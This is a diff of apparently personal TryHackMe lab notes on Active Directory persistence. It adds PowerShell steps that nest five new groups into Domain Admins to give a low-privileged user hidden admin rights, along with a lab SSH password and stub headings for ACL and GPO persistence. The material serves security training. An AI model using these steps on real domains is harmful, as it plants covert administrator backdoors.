@@ -83,7 +83,7 @@ powershell
 Get-ADDomain
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim(powershell)**
 
@@ -349,6 +349,104 @@ Get-ADUser $lowUser -Properties sidhistory
 dir \\thmdc.za.tryhackme.loc\c$ 
 ```
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (7).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
+
+## Persistence through Group Membership
+
+**Kali**
+
+```
+ssh Administrator@THMDC
+Password: tryhackmewouldnotguess1@
+```
+
+### Nesting Our Persistence
+
+**Victim(powershell) - THMDC**
+
+```
+powershell
+
+New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
+```
+
+Let's now create another group in the People->Sales OU and add our previous group as a member:
+
+**Victim(powershell) - THMDC**
+
+```
+New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
+
+Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
+```
+
+We can do this a couple more times, every time adding the previous group as a member:
+
+**Victim(powershell) - THMDC**
+
+```
+New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security
+
+Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"
+
+New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security
+
+Add-ADGroupMember -Identity "<username>_nestgroup4" -Members "<username>_nestgroup3"
+
+New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "<username>_nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security
+
+Add-ADGroupMember -Identity "<username>_nestgroup5" -Members "<username>_nestgroup4"
+
+```
+
+With the last group, let's now add that group to the Domain Admins group:
+
+**Victim(powershell) - THMDC**
+
+```
+Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
+```
+
+Lastly, let's add our low-privileged AD user to the first group we created:
+
+**Victim(powershell) - THMDC**
+
+```
+Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
+```
+
+Instantly, your low-privileged user should now have privileged access to THMDC. Let's verify this by using our SSH terminal on THMWRK1:
+
+**Victim(powershell) - THMWRK1**
+
+```
+dir \\thmdc.za.tryhackme.loc\c$\ 
+```
+
+<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+Let's also verify that even though we created multiple groups, the Domain Admins group only has one new member:
+
+**Victim(powershell) - THMDC**
+
+```
+Get-ADGroupMember -Identity "Domain Admins"
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+## Persistence through ACLs
+
+**Kali**
+
+```
+xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'$low-privUser' /p:'$Password'
+```
+
+See tryhackme on steps
+
+## Persistence through GPOs
+
+See tryhackme on steps
